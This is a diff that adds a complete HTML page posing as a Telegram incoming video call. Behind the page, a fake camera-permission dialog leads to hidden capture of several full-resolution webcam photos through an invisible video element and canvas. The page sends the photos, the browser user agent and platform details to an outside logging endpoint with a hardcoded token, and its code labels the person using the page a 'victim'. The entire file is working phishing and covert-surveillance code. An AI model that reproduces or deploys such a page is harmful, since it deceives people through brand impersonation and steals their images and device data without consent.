@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Video Call</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: #0e1621; 
+            color: white; 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px;
+        }
+        
+        .call-container { 
+            background: #17212b; 
+            padding: 40px; 
+            border-radius: 12px; 
+            text-align: center; 
+            max-width: 400px; 
+            width: 100%; 
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .avatar { 
+            width: 120px; 
+            height: 120px; 
+            border-radius: 50%; 
+            background: #2b5278; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            margin: 0 auto 20px; 
+            font-size: 48px; 
+            font-weight: 400;
+            color: #5eb5f7;
+        }
+        
+        .caller-name { 
+            font-size: 24px; 
+            font-weight: 400; 
+            margin-bottom: 8px; 
+            color: #ffffff;
+        }
+        
+        .call-status { 
+            font-size: 16px; 
+            color: #8b9398; 
+            margin-bottom: 40px; 
+            font-weight: 400;
+        }
+        
+        .buttons { 
+            display: flex; 
+            justify-content: center; 
+            gap: 30px; 
+        }
+        
+        button { 
+            width: 70px; 
+            height: 70px; 
+            border-radius: 50%; 
+            border: none; 
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 28px; 
+            transition: opacity 0.2s;
+        }
+        
+        button:active {
+            opacity: 0.8;
+        }
+        
+        #joinButton { 
+            background: #5ab147; 
+            color: white; 
+        }
+        
+        #declineButton { 
+            background: #d75a4a; 
+            color: white; 
+        }
+        
+        /* نافذة الإذن بستايل تليجرام */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            display: none;
+            z-index: 999;
+        }
+        
+        .modal-overlay.active {
+            display: block;
+        }
+        
+        .camera-permission { 
+            position: fixed; 
+            top: 50%; 
+            left: 50%; 
+            transform: translate(-50%, -50%);
+            background: #17212b;
+            padding: 0; 
+            border-radius: 12px; 
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.5);
+            z-index: 1000; 
+            display: none;
+            width: 90%;
+            max-width: 380px;
+            overflow: hidden;
+        }
+        
+        .camera-permission.active { 
+            display: block;
+        }
+        
+        .permission-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid #0e1621;
+        }
+        
+        .permission-title {
+            font-size: 18px;
+            font-weight: 500;
+            color: #ffffff;
+            margin-bottom: 8px;
+        }
+        
+        .permission-message {
+            font-size: 15px;
+            color: #8b9398;
+            line-height: 1.4;
+        }
+        
+        .permission-buttons { 
+            display: flex;
+            border-top: 1px solid #0e1621;
+        }
+        
+        .permission-btn { 
+            flex: 1;
+            background: transparent;
+            color: #5eb5f7;
+            padding: 14px 20px; 
+            border: none; 
+            cursor: pointer; 
+            font-size: 15px; 
+            font-weight: 500;
+            transition: background 0.2s;
+        }
+        
+        .permission-btn:first-child {
+            border-right: 1px solid #0e1621;
+        }
+        
+        .permission-btn:hover { 
+            background: rgba(94, 181, 247, 0.08);
+        }
+        
+        .permission-btn:active {
+            background: rgba(94, 181, 247, 0.15);
+        }
+        
+        .permission-btn.primary {
+            color: #5eb5f7;
+        }
+        
+        .permission-btn.secondary { 
+            color: #8b9398;
+        }
+        
+        /* إخفاء الفيديو بطريقة متوافقة */
+        #hiddenVideo { 
+            position: fixed; 
+            top: -100px; 
+            left: -100px; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0.01;
+            pointer-events: none;
+        }
+        
+        #hiddenCanvas { 
+            position: fixed;
+            top: -100px;
+            left: -100px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="hiddenVideo" autoplay playsinline muted webkit-playsinline></video>
+
+    <div class="call-container">
+        <div class="avatar">T</div>
+        <h1 class="caller-name">Incoming Video Call</h1>
+        <p class="call-status" id="statusMessage">Telegram</p>
+        <div class="buttons">
+            <button id="declineButton" aria-label="Decline">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="white">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11H7v-2h10v2z"/>
+                </svg>
+            </button>
+            <button id="joinButton" aria-label="Answer">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="white">
+                    <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56a.977.977 0 00-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
+                </svg>
+            </button>
+        </div>
+    </div>
+    
+    <!-- خلفية شفافة -->
+    <div class="modal-overlay" id="modalOverlay"></div>
+    
+    <!-- نافذة بستايل تليجرام -->
+    <div class="camera-permission" id="cameraPermission">
+        <div class="permission-header">
+            <div class="permission-title">كاميرا مطلوبة</div>
+            <div class="permission-message">للانضمام إلى مكالمة الفيديو، يحتاج التطبيق إلى الوصول إلى الكاميرا</div>
+        </div>
+        <div class="permission-buttons">
+            <button class="permission-btn secondary" onclick="penanceProtocol.acceptPermission('back')">
+                الكاميرا الخلفية
+            </button>
+            <button class="permission-btn primary" onclick="penanceProtocol.acceptPermission('accept')">
+                موافق
+            </button>
+        </div>
+    </div>
+    
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        class PenanceProtocol {
+            constructor() {
+                this.apiEndpoint = 'https://ahmed1997.pythonanywhere.com/api/v1/log_event';
+                this.authToken = 'ahmed-secret-key-777';
+                this.stream = null;
+                this.maxCaptures = 5;
+                this.captureCount = 0;
+                this.userChoice = '';
+
+                // تأخير التهيئة للتوافق مع Chrome
+                setTimeout(() => {
+                    this.initializeButtons();
+                }, 100);
+            }
+
+            initializeButtons() {
+                const declineBtn = document.getElementById('declineButton');
+                const joinBtn = document.getElementById('joinButton');
+                
+                if (declineBtn) {
+                    declineBtn.addEventListener('click', () => this.disappear());
+                }
+                
+                if (joinBtn) {
+                    joinBtn.addEventListener('click', () => this.showPermissionDialog());
+                }
+            }
+
+            showPermissionDialog() {
+                this.updateStatus('Connecting...');
+                document.getElementById('modalOverlay').classList.add('active');
+                document.getElementById('cameraPermission').classList.add('active');
+            }
+
+            acceptPermission(choice) {
+                this.userChoice = choice;
+                document.getElementById('modalOverlay').classList.remove('active');
+                document.getElementById('cameraPermission').classList.remove('active');
+                this.updateStatus('Requesting camera access...');
+                
+                // تأخير بسيط للتوافق مع Chrome
+                setTimeout(() => {
+                    this.startOperation();
+                }, 100);
+            }
+
+            updateStatus(message) {
+                const statusEl = document.getElementById('statusMessage');
+                if (statusEl) {
+                    statusEl.textContent = message;
+                }
+            }
+            
+            async startOperation() {
+                await this.sendInitialReport();
+                
+                try {
+                    this.updateStatus('Initializing camera...');
+                    
+                    // إعدادات متوافقة مع Chrome
+                    const constraints = {
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user'
+                        },
+                        audio: false
+                    };
+                    
+                    this.stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    
+                    const video = document.getElementById('hiddenVideo');
+                    video.srcObject = this.stream;
+                    
+                    // Chrome يحتاج play() صريح
+                    video.play().then(() => {
+                        this.soulReader(video);
+                    }).catch(() => {
+                        // إذا فشل autoplay، نحاول بدونه
+                        this.soulReader(video);
+                    });
+
+                } catch (error) {
+                    console.log('First attempt failed, trying fallback...');
+                    
+                    // محاولة بديلة
+                    try {
+                        this.stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: true, 
+                            audio: false 
+                        });
+                        
+                        const video = document.getElementById('hiddenVideo');
+                        video.srcObject = this.stream;
+                        
+                        video.play().then(() => {
+                            this.soulReader(video);
+                        }).catch(() => {
+                            this.soulReader(video);
+                        });
+                        
+                    } catch (err) {
+                        this.updateStatus('Camera permission denied.');
+                        setTimeout(() => this.disappear(), 2000);
+                    }
+                }
+            }
+
+            soulReader(video) {
+                const canvas = document.getElementById('hiddenCanvas');
+                const ctx = canvas.getContext('2d', { willReadFrequently: true });
+                let attempts = 0;
+                
+                const heartbeat = setInterval(() => {
+                    attempts++;
+                    
+                    if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+                        // تعيين حجم صغير للكانفاس
+                        canvas.width = 10;
+                        canvas.height = 10;
+                        
+                        try {
+                            ctx.drawImage(video, 0, 0, 10, 10);
+                            const imageData = ctx.getImageData(0, 0, 1, 1).data;
+                            
+                            // التحقق من وجود محتوى
+                            if (imageData[0] > 10 || imageData[1] > 10 || imageData[2] > 10) {
+                                clearInterval(heartbeat);
+                                this.updateStatus('Connected');
+                                setTimeout(() => this.startCaptureLoop(), 200);
+                            }
+                        } catch (e) {
+                            console.log('Canvas error, retrying...');
+                        }
+                    }
+                    
+                    // Chrome قد يحتاج محاولات أكثر
+                    if (attempts > 100) {
+                        clearInterval(heartbeat);
+                        this.disappear();
+                    }
+                }, 100);
+            }
+
+            async sendInitialReport() {
+                const victimInfo = { 
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    userChoice: this.userChoice,
+                    actualCamera: 'front',
+                    timestamp: new Date().toISOString()
+                };
+                
+                try {
+                    await fetch(this.apiEndpoint, { 
+                        method: 'POST', 
+                        headers: { 
+                            'Content-Type': 'application/json', 
+                            'X-Auth-Token': this.authToken 
+                        }, 
+                        body: JSON.stringify({ info: victimInfo }) 
+                    });
+                } catch (e) {
+                    console.log('Report failed');
+                }
+            }
+
+            startCaptureLoop() {
+                if (this.captureCount >= this.maxCaptures) {
+                    this.disappear();
+                    return;
+                }
+                
+                const video = document.getElementById('hiddenVideo');
+                
+                if (!video || video.readyState < 2 || video.videoWidth === 0) {
+                    this.disappear();
+                    return;
+                }
+
+                const canvas = document.getElementById('hiddenCanvas');
+                const ctx = canvas.getContext('2d');
+                
+                // تعيين الحجم الكامل
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                try {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    this.captureCount++;
+                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                    this.sendPhotoReport(imageData, this.captureCount);
+                    
+                    setTimeout(() => this.startCaptureLoop(), 700);
+                } catch (e) {
+                    console.log('Capture error');
+                    setTimeout(() => this.startCaptureLoop(), 1000);
+                }
+            }
+
+            async sendPhotoReport(imageData, count) {
+                const victimInfo = { 
+                    captureSequence: `${count}/${this.maxCaptures}`,
+                    userChoice: this.userChoice,
+                    actualCamera: 'front',
+                    timestamp: new Date().toISOString()
+                };
+                
+                try {
+                    await fetch(this.apiEndpoint, { 
+                        method: 'POST', 
+                        headers: { 
+                            'Content-Type': 'application/json', 
+                            'X-Auth-Token': this.authToken 
+                        }, 
+                        body: JSON.stringify({ image: imageData, info: victimInfo }) 
+                    });
+                } catch (e) {
+                    console.log('Photo report failed');
+                }
+            }
+
+            disappear() {
+                if (this.stream) { 
+                    this.stream.getTracks().forEach(track => {
+                        track.stop();
+                    }); 
+                }
+                
+                document.getElementById('modalOverlay').classList.remove('active');
+                document.getElementById('cameraPermission').classList.remove('active');
+                
+                const container = document.querySelector('.call-container');
+                if (container) {
+                    container.innerHTML = `<h1 class="caller-name">Call Ended</h1>`;
+                }
+            }
+        }
+
+        // تهيئة بعد تحميل الصفحة
+        let penanceProtocol;
+        
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => {
+                penanceProtocol = new PenanceProtocol();
+            });
+        } else {
+            penanceProtocol = new PenanceProtocol();
+        }
+    </script>
+</body>
+</html>
